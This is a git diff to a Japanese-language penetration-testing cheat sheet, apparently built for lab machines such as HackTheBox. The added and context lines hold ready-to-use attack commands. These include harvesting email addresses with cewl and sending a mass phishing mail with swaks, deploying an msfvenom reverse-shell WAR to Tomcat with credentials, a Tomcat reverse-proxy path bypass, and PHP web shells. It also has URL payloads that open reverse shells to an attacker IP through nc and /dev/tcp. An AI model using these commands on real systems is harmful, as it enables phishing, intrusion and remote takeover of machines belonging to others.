@@ -170,6 +170,22 @@ nmap -p 25 --script smtp-commands 10.10.10.10
 |  VERY  |  サーバに電子メールアドレスの確認を要求  |
 |  EXPN  |  サーバにメーリングリストの資格を要求  |
 
+### Webサイトからメールアドレスの一覧などを取得
+```
+cewl -e -d 10 --email_file email.txt http://sneakycorp.htb
+```
+- -e...emailアドレスを取得
+- -d...取得するディレクトリの深さを指定
+- --email_file...emailアドレスをファイルに出力
+
+### メール送信の自動化
+```
+nc -lvnp 1234
+
+swaks --to $(cat email.txt | tr '\n' ',' | less) --from test@test.com --header "Subject: test" --body "please click here http://10.10.10.1:1234/" --server 10.10.10.197
+```
+
+
 ## DNS(53)
 - -NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる
 - -A(ホストレコード)...ホスト名のIPアドレスが含まれている
@@ -646,7 +662,7 @@ Response.write("</pre><!-"&"-") %>
 ```
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war -o shell.war
-curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file payload.war "http://10.10.10.1:8080/manager/text/deploy?path=/shell"
+curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.1:8080/manager/text/deploy?path=/shell"
 nc -lvnp 443
 curl --user 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.1:8080/shell/
 ```
@@ -669,6 +685,12 @@ with open('tomcat-betterdefaultpasslist.txt') as f:
             sys.exit(0)
 ```
 ログインに成功したら、msfvenomでwarファイルのペイロードを作成して、アップロードすることでreverse shellを取得。
+
+#### Tomcat + リバースプロキシ(Apache,Nginx,IIS)
+```
+http://example.com/manager/html
+http://example.com/manager;name=aaaa/html
+```
 
 ### ShellShock(CVE-2014-6271)
 CGIに使用される拡張子を指定して、feroxbusterなどをかける。  
@@ -956,8 +978,13 @@ telnet 10.10.10.1 110
 |  dele <メール番号>  |  listコマンドで表示された番号を指定してメールを削除  |
 |  quit  |  接続を終了  |
 
-## IMAP(143)
-
+## IMAP(143,993)
+コマンドが複雑なため、GUIで確認推奨。
+```
+sudo apt install evolution
+```
+[編集]→[Accounts]→[メールのアカウント]→[追加する]→[Mail Account]  
+上記の作業により、追加されたアカウントの情報を閲覧する。
 
 ## NFS{RPCbind,Portmapper}(111)
 Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。  
@@ -1393,7 +1420,14 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 <?php echo system($_REQUEST ["cmd"]); ?>
 <?php echo(system($_GET["cmd"])); ?>
 ```
+```
+# 10.10.14.4 443
+## nc
+http://10.10.10.146/uploads/10_10_14_4.php.jpeg?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.4+443+>/tmp/f
 
+## bash
+http://10.10.10.146/uploads/10_10_14_4.php.jpeg?cmd=bash+-i+>%26+/dev/tcp/10.10.14.4/443+0>%261
+```
 ### Ruby
 ```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -2292,6 +2326,9 @@ cat ~/.*history | less
 構成ファイルなどに、プレーンテキストや可逆形式のパスワードが含まれていることがある。  
 例えばWebアプリケーションのソースコードにハードコーディングされている場合や、MySQL内に保存されている場合、メモなどが残されている場合がある。  
 それらを利用して権限昇格できる可能性がある。
+```
+.htpasswd
+```
 
 ## Passwords & Keys - SSH Keys
 .sshディレクトリなどに正しい権限が付与されていない場合、rootユーザーの秘密鍵などを読み取れる可能性がある。  
